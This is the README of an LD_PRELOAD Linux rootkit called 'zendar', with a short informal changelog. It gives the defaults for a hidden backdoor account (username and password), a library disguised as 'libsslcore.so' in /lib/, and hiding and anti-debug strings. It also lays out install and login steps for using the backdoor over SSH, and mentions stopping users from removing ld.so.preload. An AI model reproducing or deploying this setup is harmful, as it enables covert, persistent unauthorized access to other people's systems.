```
This is a private rootkit, and thus this README will not adhere to public requirements or preferences.
Scrap that. I have virtually no need for this, it's just a shittier, but smaller version of an azazel/jynx2 hybrid. Do whatever you want with this.
Alright, apparently there was some kind of strange interest in this. @Reiko: I changed how the user is prevented from removing the ld.so.preload file. I still use strstr(), so I do apologize for that, I will eventually get around to using a better method.
I understand that having to change configurable variables in both install and zendar.c is a tedious operation, I will centralize all variables in the install script eventually. I have a free weekend so expect that to happen this week. 
@Reiko: I also removed ptrace() from the kit.
```
```
Default configuration variables:    (install)
                                    username = "zendar"
                                    password = "zendar123"
                                    salt = "password_salt"
                                    home_dir = "/etc/ld.so.conf.d/"
                                    install_dir = "/lib/"
									lib_name = "libsslcore.so"
                                    (zendar.c)
                                    HIDDEN_STRING "_zendar"
									LIB_NAME "libsslcore.so"
                                    undef DEBUG
                                    ANTI_DEBUG "Secret Sex Loaf of a Single Mom"

Installation & Usage:               (installation)
                                    tar xvpf zendar.tar
									sudo ./install
                                    (usage)
                                    ssh username@host
                                        (the following will enable core utilities)
                                        alias ls='ls --color=auto'
                                        export PS1='\u@zendar \W >> '
                                            (VITAL, YOU MUST ENABLE THE FOLLOWING!)
                                                export ZENDAR='1'
```
